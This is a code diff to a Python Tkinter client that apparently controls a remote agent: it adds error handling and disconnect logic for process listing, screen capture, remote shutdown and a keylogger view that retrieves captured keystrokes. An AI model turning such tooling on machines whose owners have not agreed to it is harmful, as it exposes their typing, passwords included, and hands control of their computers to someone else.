@@ -418,14 +418,19 @@ class Keylog(Toplevel):
 
     def unhook(self):
         if self.is_hooking:
+            self.is_hooking = False
             self.client.sendall(bytes(UNHOOK,'utf8'))
         pass
 
     def print(self):
+        keys = ''
         self.client.sendall(bytes(PRINT,'utf8'))
-        size = int(self.client.recv(2048).decode('utf8'))
+        length = int(self.client.recv(2).decode('utf8'))
         self.client.sendall(bytes('1','utf8'))
-        keys = int(self.client.recv(size).decode('utf8'))
+        if length == 0:
+            self.client.recv(1)
+        else:
+            keys = self.client.recv(length).decode('utf8')
         self.client.sendall(bytes('1','utf8'))
         self.text.configure(state = NORMAL)
         self.text.insert(END,keys)
@@ -499,7 +504,7 @@ class App(Tk):
         self.app_btn = Button(self.fr2,text = "App Running",bd = 5,font = 10,padx = 10,pady = 10, command = self.App_running)
         self.app_btn.grid(column = 2 , row = 0, columnspan = 3,sticky=N+S+E+W)
 
-        self.shut_down_btn = Button(self.fr2,text = "Shut down",bd = 5,font = 10,padx = 10,pady = 10)
+        self.shut_down_btn = Button(self.fr2,text = "Shut down",bd = 5,font = 10,padx = 10,pady = 10,command = self.Shut_down)
         self.shut_down_btn.grid(column = 2, row = 1,sticky=N+S+E+W)
 
         self.scr_capture_btn = Button(self.fr2,text = "Screen capture",bd = 5,font = 10,padx = 10,pady = 10, command=self.Scr_capture)
@@ -511,8 +516,10 @@ class App(Tk):
         self.registry_btn = Button(self.fr2,text = "Edit registry",bd = 5,font = 10,padx = 10,pady = 10)
         self.registry_btn.grid(column = 2, row = 2, columnspan = 4,sticky=N+S+E+W)
 
-        self.exit_btn = Button(self.fr2,text = "Exit",bd = 5,font = 10,padx = 10,pady = 10)
+        self.exit_btn = Button(self.fr2,text = "Exit",bd = 5,font = 10,padx = 10,pady = 10, command =  self.exit)
         self.exit_btn.grid(column = 6, row=2,sticky=N+S+E+W)
+        
+        self.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def foc_in(self,event):
         if event.widget == self.input_ip:
@@ -528,6 +535,7 @@ class App(Tk):
             try:
                 self.client.connect(server_address)
                 self.connected = True
+                self.focus()
                 messagebox.showinfo(title="Notification",message="Connection successful !!!")
             except Exception as e:
                 print(e)
@@ -536,35 +544,55 @@ class App(Tk):
 
     def Process_running(self):
         if self.connected:
-            self.client.sendall(bytes(PROCESS_RUNNING,'utf8'))
-            Viewapp = Process(self.client,self)
+            try:
+                self.client.sendall(bytes(PROCESS_RUNNING,'utf8'))
+                Viewapp = Process(self.client,self)
+            except:
+                messagebox.showerror(title="Error", message="Opps\nConnection error!")
         else:
             messagebox.showerror(title="Error", message="Opps\nConnection error!")            
         pass
 
     def App_running(self):
         if self.connected:
-            self.client.sendall(bytes(APP_RUNNING,'utf8'))
-            Viewapp = ListApp(self.client,self)
+            try:
+                self.client.sendall(bytes(APP_RUNNING,'utf8'))
+                Viewapp = ListApp(self.client,self)
+            except:
+                messagebox.showerror(title="Error", message="Opps\nConnection error!")
         else:
             messagebox.showerror(title="Error", message="Opps\nConnection error!")
         pass
 
     def Shut_down(self):
+        if self.connected:
+            try:
+                print('da gui')
+                self.client.sendall(bytes(SHUT_DOWN,'utf8'))
+            except:
+                messagebox.showerror(title="Error", message="Opps\nConnection error!")
+        else:
+            messagebox.showerror(title="Error", message="Opps\nConnection error!")
         pass
 
     def Scr_capture(self):
         if self.connected:
-            self.client.sendall(bytes(SCREEN_CAPTURE,'utf8'))
-            Viewapp = Pic(self.client,self)
+            try:
+                self.client.sendall(bytes(SCREEN_CAPTURE,'utf8'))
+                Viewapp = Pic(self.client,self)
+            except:
+                messagebox.showerror(title="Error", message="Opps\nConnection error!")
         else:
             messagebox.showerror(title="Error", message="Opps\nConnection error!")
         pass
 
     def Keystroke(self):
         if self.connected:
-            self.client.sendall(bytes(KEYSTROKE,'utf8'))
-            Viewapp = Keylog(self.client,self)
+            try:
+                self.client.sendall(bytes(KEYSTROKE,'utf8'))
+                Viewapp = Keylog(self.client,self)
+            except:
+                messagebox.showerror(title="Error", message="Opps\nConnection error!")    
         else:
             messagebox.showerror(title="Error", message="Opps\nConnection error!")
         pass
@@ -573,12 +601,35 @@ class App(Tk):
         pass
 
     def exit(self):
+        if self.connected:
+            self.disconnect()
+
+            self.focus()
+            self.input_ip.delete(0,'end')
+            self.input_ip.configure(fg='grey',font=14)
+            self.input_ip.insert(0,"Input IP")
+            self.input_ip.bind("<FocusIn>", self.foc_in)
+            print('out out out')
+        else:
+            messagebox.showerror(title="Error", message="Opps\nConnection error!")
         pass
 
-    def quit(self):
+    def disconnect(self):
+        try:
+            self.client.sendall(bytes(EXIT,'utf8'))
+        except Exception as e:
+            print(e)
+        finally:
+            self.client.close()
+            self.connected = False
+            self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         pass
 
     def on_closing(self):
+        self.focus()
+        if self.connected:
+            self.disconnect()
+        self.destroy()
         pass    
 
     def run(self):
